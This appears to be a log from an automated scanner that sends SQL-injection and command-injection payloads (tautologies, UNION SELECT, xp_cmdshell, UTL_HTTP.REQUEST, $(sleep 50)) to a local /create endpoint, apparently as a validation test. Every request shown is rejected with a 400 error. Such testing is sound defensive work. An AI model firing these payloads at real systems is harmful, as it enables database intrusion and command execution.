[INFO]00:17:44:941-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "'%20or%20''='\n", "goods_id": "1"}}
[INFO]00:17:44:941-caseScan.py:113 >> code: 400
[INFO]00:17:44:942-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:954-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "'%20or%20'x'='x\n", "goods_id": "1"}}
[INFO]00:17:44:955-caseScan.py:113 >> code: 400
[INFO]00:17:44:956-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:969-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "%20or%20x=x\n", "goods_id": "1"}}
[INFO]00:17:44:969-caseScan.py:113 >> code: 400
[INFO]00:17:44:970-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:982-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "')%20or%20('x'='x\n", "goods_id": "1"}}
[INFO]00:17:44:983-caseScan.py:113 >> code: 400
[INFO]00:17:44:984-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:998-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "0 or 1=1\n", "goods_id": "1"}}
[INFO]00:17:44:999-caseScan.py:113 >> code: 400
[INFO]00:17:44:999-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:011-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or 0=0 --\n", "goods_id": "1"}}
[INFO]00:17:45:015-caseScan.py:113 >> code: 400
[INFO]00:17:45:016-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:029-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "\" or 0=0 --\n", "goods_id": "1"}}
[INFO]00:17:45:030-caseScan.py:113 >> code: 400
[INFO]00:17:45:031-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:044-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "or 0=0 --\n", "goods_id": "1"}}
[INFO]00:17:45:045-caseScan.py:113 >> code: 400
[INFO]00:17:45:045-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:058-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or 0=0 #\n", "goods_id": "1"}}
[INFO]00:17:45:058-caseScan.py:113 >> code: 400
[INFO]00:17:45:059-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:071-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": " or 0=0 #\"\n", "goods_id": "1"}}
[INFO]00:17:45:071-caseScan.py:113 >> code: 400
[INFO]00:17:45:072-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:085-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "or 0=0 #\n", "goods_id": "1"}}
[INFO]00:17:45:085-caseScan.py:113 >> code: 400
[INFO]00:17:45:086-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:098-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or 1=1--\n", "goods_id": "1"}}
[INFO]00:17:45:098-caseScan.py:113 >> code: 400
[INFO]00:17:45:099-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:111-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "\" or 1=1--\n", "goods_id": "1"}}
[INFO]00:17:45:112-caseScan.py:113 >> code: 400
[INFO]00:17:45:112-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:124-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or '1'='1'--\n", "goods_id": "1"}}
[INFO]00:17:45:125-caseScan.py:113 >> code: 400
[INFO]00:17:45:125-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:136-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or 1 --'\n", "goods_id": "1"}}
[INFO]00:17:45:137-caseScan.py:113 >> code: 400
[INFO]00:17:45:137-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:150-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "or 1=1--\n", "goods_id": "1"}}
[INFO]00:17:45:150-caseScan.py:113 >> code: 400
[INFO]00:17:45:151-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:163-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "or%201=1\n", "goods_id": "1"}}
[INFO]00:17:45:164-caseScan.py:113 >> code: 400
[INFO]00:17:45:164-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:177-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "or%201=1 --\n", "goods_id": "1"}}
[INFO]00:17:45:178-caseScan.py:113 >> code: 400
[INFO]00:17:45:178-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:190-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or 1=1 or ''='\n", "goods_id": "1"}}
[INFO]00:17:45:191-caseScan.py:113 >> code: 400
[INFO]00:17:45:191-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:204-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": " or 1=1 or \"\"=\n", "goods_id": "1"}}
[INFO]00:17:45:204-caseScan.py:113 >> code: 400
[INFO]00:17:45:205-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:217-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or a=a--\n", "goods_id": "1"}}
[INFO]00:17:45:218-caseScan.py:113 >> code: 400
[INFO]00:17:45:219-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:231-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": " or a=a\n", "goods_id": "1"}}
[INFO]00:17:45:232-caseScan.py:113 >> code: 400
[INFO]00:17:45:233-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:245-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "') or ('a'='a\n", "goods_id": "1"}}
[INFO]00:17:45:246-caseScan.py:113 >> code: 400
[INFO]00:17:45:246-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:258-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": ") or (a=a\n", "goods_id": "1"}}
[INFO]00:17:45:259-caseScan.py:113 >> code: 400
[INFO]00:17:45:259-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:271-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "hi or a=a\n", "goods_id": "1"}}
[INFO]00:17:45:271-caseScan.py:113 >> code: 400
[INFO]00:17:45:272-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:284-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "hi or 1=1 --\"\n", "goods_id": "1"}}
[INFO]00:17:45:284-caseScan.py:113 >> code: 400
[INFO]00:17:45:285-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:296-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "hi' or 1=1 --\n", "goods_id": "1"}}
[INFO]00:17:45:297-caseScan.py:113 >> code: 400
[INFO]00:17:45:297-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:309-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "hi' or 'a'='a\n", "goods_id": "1"}}
[INFO]00:17:45:310-caseScan.py:113 >> code: 400
[INFO]00:17:45:311-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:324-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "hi') or ('a'='a\n", "goods_id": "1"}}
[INFO]00:17:45:325-caseScan.py:113 >> code: 400
[INFO]00:17:45:325-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:337-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "\"hi\"\") or (\"\"a\"\"=\"\"a\"\n", "goods_id": "1"}}
[INFO]00:17:45:338-caseScan.py:113 >> code: 400
[INFO]00:17:45:339-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:351-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "'hi' or 'x'='x';\n", "goods_id": "1"}}
[INFO]00:17:45:352-caseScan.py:113 >> code: 400
[INFO]00:17:45:353-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:366-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "@variable\n", "goods_id": "1"}}
[INFO]00:17:45:366-caseScan.py:113 >> code: 400
[INFO]00:17:45:367-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:380-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": ",@variable\n", "goods_id": "1"}}
[INFO]00:17:45:380-caseScan.py:113 >> code: 400
[INFO]00:17:45:381-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:393-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "PRINT\n", "goods_id": "1"}}
[INFO]00:17:45:394-caseScan.py:113 >> code: 400
[INFO]00:17:45:395-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:408-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "PRINT @@variable\n", "goods_id": "1"}}
[INFO]00:17:45:409-caseScan.py:113 >> code: 400
[INFO]00:17:45:409-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:422-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "select\n", "goods_id": "1"}}
[INFO]00:17:45:422-caseScan.py:113 >> code: 400
[INFO]00:17:45:423-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:436-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "insert\n", "goods_id": "1"}}
[INFO]00:17:45:436-caseScan.py:113 >> code: 400
[INFO]00:17:45:437-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:449-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "as\n", "goods_id": "1"}}
[INFO]00:17:45:449-caseScan.py:113 >> code: 400
[INFO]00:17:45:450-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:462-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "or\n", "goods_id": "1"}}
[INFO]00:17:45:463-caseScan.py:113 >> code: 400
[INFO]00:17:45:463-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:476-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "procedure\n", "goods_id": "1"}}
[INFO]00:17:45:476-caseScan.py:113 >> code: 400
[INFO]00:17:45:477-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:489-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "limit\n", "goods_id": "1"}}
[INFO]00:17:45:490-caseScan.py:113 >> code: 400
[INFO]00:17:45:490-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:503-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "order by\n", "goods_id": "1"}}
[INFO]00:17:45:503-caseScan.py:113 >> code: 400
[INFO]00:17:45:504-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:518-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "asc\n", "goods_id": "1"}}
[INFO]00:17:45:519-caseScan.py:113 >> code: 400
[INFO]00:17:45:519-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:531-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "desc\n", "goods_id": "1"}}
[INFO]00:17:45:532-caseScan.py:113 >> code: 400
[INFO]00:17:45:533-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:545-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "delete\n", "goods_id": "1"}}
[INFO]00:17:45:545-caseScan.py:113 >> code: 400
[INFO]00:17:45:546-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:558-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "update\n", "goods_id": "1"}}
[INFO]00:17:45:559-caseScan.py:113 >> code: 400
[INFO]00:17:45:559-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:574-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "distinct\n", "goods_id": "1"}}
[INFO]00:17:45:575-caseScan.py:113 >> code: 400
[INFO]00:17:45:575-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:588-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "having\n", "goods_id": "1"}}
[INFO]00:17:45:589-caseScan.py:113 >> code: 400
[INFO]00:17:45:589-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:602-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "truncate\n", "goods_id": "1"}}
[INFO]00:17:45:603-caseScan.py:113 >> code: 400
[INFO]00:17:45:604-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:617-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "replace\n", "goods_id": "1"}}
[INFO]00:17:45:618-caseScan.py:113 >> code: 400
[INFO]00:17:45:618-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:631-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "like\n", "goods_id": "1"}}
[INFO]00:17:45:631-caseScan.py:113 >> code: 400
[INFO]00:17:45:632-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:644-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "handler\n", "goods_id": "1"}}
[INFO]00:17:45:645-caseScan.py:113 >> code: 400
[INFO]00:17:45:646-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:659-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "bfilename\n", "goods_id": "1"}}
[INFO]00:17:45:660-caseScan.py:113 >> code: 400
[INFO]00:17:45:660-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:673-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or username like '%\n", "goods_id": "1"}}
[INFO]00:17:45:674-caseScan.py:113 >> code: 400
[INFO]00:17:45:675-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:687-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or uname like '%\n", "goods_id": "1"}}
[INFO]00:17:45:688-caseScan.py:113 >> code: 400
[INFO]00:17:45:689-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:700-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or userid like '%\n", "goods_id": "1"}}
[INFO]00:17:45:701-caseScan.py:113 >> code: 400
[INFO]00:17:45:701-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:713-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or uid like '%\n", "goods_id": "1"}}
[INFO]00:17:45:714-caseScan.py:113 >> code: 400
[INFO]00:17:45:714-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:726-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or user like '%\n", "goods_id": "1"}}
[INFO]00:17:45:727-caseScan.py:113 >> code: 400
[INFO]00:17:45:728-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:741-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "exec xp\n", "goods_id": "1"}}
[INFO]00:17:45:742-caseScan.py:113 >> code: 400
[INFO]00:17:45:742-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:754-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "exec sp\n", "goods_id": "1"}}
[INFO]00:17:45:755-caseScan.py:113 >> code: 400
[INFO]00:17:45:755-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:767-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "'; exec master..xp_cmdshell\n", "goods_id": "1"}}
[INFO]00:17:45:768-caseScan.py:113 >> code: 400
[INFO]00:17:45:768-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:780-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "'; exec xp_regread\n", "goods_id": "1"}}
[INFO]00:17:45:781-caseScan.py:113 >> code: 400
[INFO]00:17:45:781-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:794-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "t'exec master..xp_cmdshell 'nslookup www.google.com'--\n", "goods_id": "1"}}
[INFO]00:17:45:795-caseScan.py:113 >> code: 400
[INFO]00:17:45:795-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:808-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "--sp_password\n", "goods_id": "1"}}
[INFO]00:17:45:808-caseScan.py:113 >> code: 400
[INFO]00:17:45:809-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:823-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "\\x27UNION SELECT\n", "goods_id": "1"}}
[INFO]00:17:45:823-caseScan.py:113 >> code: 400
[INFO]00:17:45:824-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:838-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' UNION SELECT\n", "goods_id": "1"}}
[INFO]00:17:45:839-caseScan.py:113 >> code: 400
[INFO]00:17:45:839-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:855-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' UNION ALL SELECT\n", "goods_id": "1"}}
[INFO]00:17:45:856-caseScan.py:113 >> code: 400
[INFO]00:17:45:856-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:870-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or (EXISTS)\n", "goods_id": "1"}}
[INFO]00:17:45:870-caseScan.py:113 >> code: 400
[INFO]00:17:45:871-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:884-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' (select top 1\n", "goods_id": "1"}}
[INFO]00:17:45:885-caseScan.py:113 >> code: 400
[INFO]00:17:45:885-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:897-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "'||UTL_HTTP.REQUEST\n", "goods_id": "1"}}
[INFO]00:17:45:897-caseScan.py:113 >> code: 400
[INFO]00:17:45:898-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:910-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "1;SELECT%20*\n", "goods_id": "1"}}
[INFO]00:17:45:910-caseScan.py:113 >> code: 400
[INFO]00:17:45:911-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:923-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "to_timestamp_tz\n", "goods_id": "1"}}
[INFO]00:17:45:924-caseScan.py:113 >> code: 400
[INFO]00:17:45:924-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:936-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "tz_offset\n", "goods_id": "1"}}
[INFO]00:17:45:937-caseScan.py:113 >> code: 400
[INFO]00:17:45:938-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:949-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "<>\"'%;)(&+\n", "goods_id": "1"}}
[INFO]00:17:45:950-caseScan.py:113 >> code: 400
[INFO]00:17:45:950-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:962-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "'%20or%201=1\n", "goods_id": "1"}}
[INFO]00:17:45:962-caseScan.py:113 >> code: 400
[INFO]00:17:45:963-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:974-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "%27%20or%201=1\n", "goods_id": "1"}}
[INFO]00:17:45:975-caseScan.py:113 >> code: 400
[INFO]00:17:45:976-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:45:988-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "%20$(sleep%2050)\n", "goods_id": "1"}}
[INFO]00:17:45:988-caseScan.py:113 >> code: 400
[INFO]00:17:45:989-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:001-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "%20'sleep%2050'\n", "goods_id": "1"}}
[INFO]00:17:46:001-caseScan.py:113 >> code: 400
[INFO]00:17:46:002-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:015-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "char%4039%41%2b%40SELECT\n", "goods_id": "1"}}
[INFO]00:17:46:016-caseScan.py:113 >> code: 400
[INFO]00:17:46:016-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:029-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "&apos;%20OR\n", "goods_id": "1"}}
[INFO]00:17:46:030-caseScan.py:113 >> code: 400
[INFO]00:17:46:030-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:044-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "'sqlattempt1\n", "goods_id": "1"}}
[INFO]00:17:46:044-caseScan.py:113 >> code: 400
[INFO]00:17:46:045-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:058-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "(sqlattempt2)\n", "goods_id": "1"}}
[INFO]00:17:46:059-caseScan.py:113 >> code: 400
[INFO]00:17:46:060-caseScan.py:114 >> response: {
  "message": "data error"
}

